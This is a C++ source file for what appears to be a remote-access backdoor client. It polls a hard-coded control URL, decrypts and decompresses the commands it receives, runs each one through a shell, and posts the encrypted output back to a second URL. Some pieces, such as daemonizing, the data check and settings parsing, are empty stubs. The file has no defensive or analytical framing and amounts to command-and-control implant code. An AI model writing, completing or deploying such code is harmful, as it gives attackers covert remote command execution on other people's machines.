#include <string>
#include <vector>
#include <sstream>
#include <iostream>

#include <unistd.h>

#include "hs_http.h"
#include "hs_crypt.h"
#include "hs_compress.h"
#include "hs_base64.h"
#include "hs_exception.h"
#include "hs_misc.h"

constexpr const char *GET_URL = "http://127.0.0.1:3000/abcde";
constexpr const char *POST_URL = "http://127.0.0.1:3000/fghij";

class hs_settings
{
public:
	std::string get_url;
	std::string post_url;
	std::string password;
	unsigned int interval = 5;

	void init(int argc, char *argv[]);
};

void hs_settings::init(int argc, char *argv[])
{
	this->get_url = GET_URL;
	this->post_url = POST_URL;
	this->password = "random key";
}

int signal = 0;

void daemonize();
int hs(hs_settings &setting);
void hs_impl(hs_settings &setting);

bool hs_check_data(std::vector<uint8_t> data);
std::string hs_parse_setting(const std::string &line);
std::string hs_parse_command(const std::string &line);

int main(int argc, char *argv[])
{
	daemonize();

	hs_settings setting;
	setting.init(argc, argv);

	return hs(setting);
}

void daemonize()
{
	return;
}

int hs(hs_settings &setting)
{
	while (signal == 0)
	{
		try
		{
			hs_impl(setting);
		}
		catch (hs_exception &e)
		{
			// logger
			std::cout << e.what() << std::endl;
		}
		sleep(setting.interval);
	}
	return 0;
}

void hs_impl(hs_settings &setting)
{
	auto hres = hs_http_get(setting.get_url);
	if (hres.body.length() == 0) return;
	auto deflated = hs_gunzip(
			hs_decrypt(
				hs_base64_decode(reinterpret_cast<const unsigned char *>(hres.body.c_str()), hres.body.length()),
				setting.password));

	hs_check_data(deflated);

	std::string result;
	std::istringstream iss(std::string(deflated.begin(), deflated.end()));
	std::string line;
	while (std::getline(iss, line))
	{
		result += "==========\n";
		result += line;
		result += "\n";
		result += "----------\n";
		if (line.compare(0, 2, "s:") == 0)
		{
			result += hs_parse_setting(line);
		}
		else
		{
			result += hs_parse_command(line);
		}
		result += "==========\n";
	}

	auto encoded_data = hs_base64_encode(
			hs_encrypt(
				hs_gzip(reinterpret_cast<const unsigned char *>(result.c_str()), result.length()),
				setting.password));
	auto post_data = std::string("data=") + url_encode(std::string(encoded_data.begin(), encoded_data.end()));
	hs_http_post(setting.post_url, post_data, "");
}

bool hs_check_data(std::vector<uint8_t> data)
{
	return true;
}

std::string hs_parse_setting(const std::string &line)
{
	return "Not implement yet.\n";
}

std::string hs_parse_command(const std::string &line)
{
	auto cmd = line + " 2>&1";
	return hs_exec(cmd);
}
